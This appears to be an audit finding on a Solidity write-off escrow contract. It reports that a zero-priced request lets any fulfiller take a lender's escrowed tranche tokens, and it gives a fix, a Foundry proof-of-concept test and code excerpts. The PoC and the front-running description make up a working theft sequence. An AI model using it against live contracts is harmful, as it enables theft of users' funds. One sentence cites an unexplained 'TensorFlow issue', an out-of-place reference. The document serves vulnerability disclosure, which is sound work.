### Title
Zero-priced write-off requests allow a fulfiller to steal escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary

`createWriteOffRequest` validates the escrowed tranche amount but does not validate `underlyingsRequested`, so a lender can accidentally create a request containing nonzero tranches and a zero underlying price. [1](#0-0) . `fullfillWriteOffRequest` then accepts `_underlyings == 0` because it only rejects underpayment relative to the stored zero ask, deletes the request, transfers no underlying consideration, and sends all escrowed tranche tokens to the fulfiller. [2](#0-1) .

### Finding Description

The escrow treats a tranche-token deposit and its requested underlying payment as a paired trade, but validates only one side of that pair. [3](#0-2) . Specifically, creation rejects `amount == 0` while permitting `underlyingsRequested == 0`. [4](#0-3) .

During fulfillment, `currentRequest.tranches != _tranches` must be false, and `_underlyings < currentRequest.underlyings` must be false. [5](#0-4) . For a malformed request with `underlyings == 0`, passing `_underlyings == 0` satisfies the payment check. [6](#0-5) . The function subsequently transfers zero underlying to the lender and transfers the entire escrowed `_tranches` amount to `msg.sender`. [7](#0-6) .

This is the same input-validation bug class as the TensorFlow issue: one mandatory operand is checked while another operand that determines whether the operation is economically valid is left unchecked. [4](#0-3) .

### Impact Explanation

An unprivileged fulfiller can permanently acquire a lender’s entire escrowed tranche position without paying any underlying. [8](#0-7) . For a request containing `10,000e18` tranche tokens and `0` requested underlying, the attacker pays `0` and receives `10,000e18` tranche tokens, while the lender receives `0` net underlying because the exit fee calculation also evaluates to zero. [9](#0-8) .

The stolen tranche tokens represent the lender’s transferable claim in the CDO, and the escrow request is deleted atomically, so the lender cannot use `deleteWriteOffRequest` after the fulfillment transaction succeeds. [10](#0-9) . The invariant violated is that an escrowed write-off exchange must transfer a nonzero agreed consideration to the lender before releasing the escrowed tranche tokens. [11](#0-10) .

### Likelihood Explanation

Creation requires the CDO epoch to be running and a nonzero tranche deposit, but there is no lender KYC check or privileged authorization on this escrow path. [12](#0-11) . Fulfillment is explicitly callable by any wallet, not only the borrower. [13](#0-12) .

An attacker can monitor write-off request transactions or the escrow state, submit `fullfillWriteOffRequest(victim, requestedTranches, 0)`, and front-run an attempted cancellation. [2](#0-1) . The exploit is conditional on a lender submitting a malformed zero-price request, so it does not allow theft from arbitrary correctly priced requests. [6](#0-5) .

### Recommendation

Reject zero-priced sell requests in `createWriteOffRequest`, preferably with `Is0`, so both sides of the escrowed exchange must be nonzero. [4](#0-3) .

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol
if (amount == 0 || underlyingsRequested == 0) revert Is0();
```

As defense in depth, `fullfillWriteOffRequest` should also reject requests whose stored `underlyings` field is zero, protecting any zero-priced request created before an upgrade. [5](#0-4) .

### Proof of Concept

The following Foundry test fits the existing `TestIdleCreditVaultWriteOffEscrow` fork fixture, which already initializes the escrow against the live CDO and approves it to spend `LP` tranche tokens. [14](#0-13) .

```solidity
// test/foundry/IdleCreditVaultWriteOffEscrow.t.sol
function testFulfillerStealsZeroPricedWriteOffRequest() external {
    uint256 requestedTranches = 10_000e18;
    address attacker = makeAddr("zero-price-fulfiller");

    uint256 lpUnderlyingBefore = underlying.balanceOf(LP);
    uint256 attackerTranchesBefore = tranche.balanceOf(attacker);
    uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);

    // Victim escrows valuable tranche tokens but accidentally requests zero USDC.
    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, 0);

    assertEq(tranche.balanceOf(address(escrow)), requestedTranches);
    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
    assertEq(tranches, requestedTranches);
    assertEq(underlyings, 0);
    assertEq(escrow.pendingUnderlyings(), 0);

    // Any unprivileged fulfiller can satisfy the zero-price request.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

    (tranches, underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 0);
    assertEq(underlyings, 0);

    // The attacker paid nothing and received all escrowed tranche tokens.
    assertEq(
        underlying.balanceOf(attacker),
        attackerUnderlyingBefore,
        "attacker should not pay underlying"
    );
    assertEq(
        tranche.balanceOf(attacker) - attackerTranchesBefore,
        requestedTranches,
        "attacker should receive escrowed tranches"
    );
    assertEq(
        underlying.balanceOf(LP),
        lpUnderlyingBefore,
        "lender should receive zero underlying"
    );
}
```

The transaction succeeds because the stored `currentRequest.underlyings` is zero, making `_underlyings < currentRequest.underlyings` false when `_underlyings` is also zero. [6](#0-5) . The attacker then receives `_tranches` directly from the escrow despite paying nothing. [8](#0-7) .

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
